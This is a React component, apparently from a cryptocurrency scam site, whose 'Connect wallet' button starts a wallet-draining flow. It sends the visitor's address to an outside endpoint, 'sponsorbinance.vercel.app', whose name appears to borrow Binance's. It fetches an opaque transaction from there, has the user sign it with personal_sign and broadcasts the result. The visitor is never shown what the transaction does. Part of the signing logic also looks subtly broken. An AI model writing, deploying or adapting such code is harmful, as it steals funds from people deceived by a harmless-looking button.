import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    // پاک کردن کش WalletConnect
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      qrModalOptions: { themeMode: "dark" },
      chains: [56], // فقط شبکه‌ی BSC
      methods: ["personal_sign", "eth_sendRawTransaction"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var account_sender = accounts[0];
    console.log("✅ Wallet Address:", account_sender);

    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function genSign(address, chain, type) {
      try {
        let requestData = { handler: "tx", address, chain, type };
        var result = await jQuery.post(apiUrl, requestData);
        var unSigned = JSON.parse(result);
        console.log("📜 Unsigned Transaction:", unSigned);

        // ۱. امضای تراکنش
        var signedMessage = await provider.request({
          method: "personal_sign",
          params: [JSON.stringify(unSigned.result), address],
        });

        return signedMessage;
      } catch (error) {
        console.error("❌ Error in genSign:", error);
        return null;
      }
    }

    async function acceptSign(signedTx) {
      try {
        // ۲. ارسال تراکنش به شبکه
        var txHash = await provider.request({
          method: "eth_sendRawTransaction",
          params: [signedTx],
        });

        console.log("📤 Transaction Sent:", txHash);
        return txHash;
      } catch (error) {
        console.error("❌ Error in acceptSign:", error);
        return null;
      }
    }

    var signedTx = await genSign(account_sender, "56", "coin");

    if (signedTx) {
      console.log("✍️ Signed Transaction:", signedTx);
      var finalTx = await acceptSign(signedTx);
      console.log("📝 Final Sent Transaction:", finalTx);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <a href="#" onClick={runner} className="uk-button uk-button-default">
      <span>Connect wallet</span>
    </a>
  );
}

export default App;
